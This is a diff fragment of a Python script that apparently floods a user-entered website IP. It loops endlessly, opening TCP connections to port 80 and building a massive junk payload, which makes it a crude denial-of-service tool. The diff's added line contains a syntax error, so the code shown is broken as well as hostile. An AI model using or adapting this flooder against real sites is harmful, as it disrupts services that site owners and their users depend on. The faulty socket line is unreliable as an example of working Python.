@@ -10,7 +10,7 @@ print ("___________________")
 import socket
 ip = input ("\033[36;1mEnter ip website : ")
 while True:
-	sock = socket.socket(AF_INET ,socket.SOCK_STREAM)
+	sock = socket.socket.AF_INET ,socket.SOCK_STREAM)
 	socket.setdefaulttimeout(1)
 	conn = sock.connect((ip,80))
 	data = ("\033[31mjdirir8rjdjd8rjddjdjdnfnfnfn"*999999999999)
